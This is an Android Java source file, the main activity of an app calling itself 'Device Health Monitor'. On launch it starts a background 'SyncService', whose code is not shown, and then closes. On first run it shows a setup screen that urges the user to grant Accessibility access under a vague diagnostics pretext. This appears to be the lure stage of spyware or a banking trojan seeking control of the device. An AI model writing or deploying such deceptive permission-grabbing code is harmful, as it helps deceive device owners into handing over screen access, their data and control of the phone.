package com.device.health.monitor;

import android.app.Activity;
import android.content.*;
import android.net.Uri;
import android.os.*;
import android.provider.Settings;
import android.widget.*;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent svc = new Intent(this, SyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        SharedPreferences prefs = getSharedPreferences(SyncService.PREFS, MODE_PRIVATE);
        if (!prefs.getBoolean("setup_done", false)) {
            showSetup();
        } else {
            finish();
        }
    }

    private void showSetup() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(60, 80, 60, 40);

        TextView title = new TextView(this);
        title.setText("Device Health Monitor");
        title.setTextSize(20f);
        title.setTextColor(0xFF1a1a2e);
        root.addView(title);

        TextView msg = new TextView(this);
        msg.setText("\nMonitors device performance and syncs health diagnostics in the background." +
                    "\n\nTo enable full background monitoring, grant Accessibility access below.");
        msg.setTextSize(14f);
        msg.setTextColor(0xFF444444);
        root.addView(msg);

        Button btnAcc = new Button(this);
        btnAcc.setText("Enable Monitoring Access");
        btnAcc.setOnClickListener(v -> openAcc());
        root.addView(btnAcc);

        Button btnSkip = new Button(this);
        btnSkip.setText("Remind Me Later");
        btnSkip.setOnClickListener(v -> done());
        root.addView(btnSkip);

        setContentView(root);
    }

    private void openAcc() {
        try { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); }
        catch (Exception e) { startActivity(new Intent(Settings.ACTION_SETTINGS)); }
    }

    private void done() {
        getSharedPreferences(SyncService.PREFS, MODE_PRIVATE)
            .edit().putBoolean("setup_done", true).apply();
        finish();
    }

    @Override public void onBackPressed() { done(); }
}
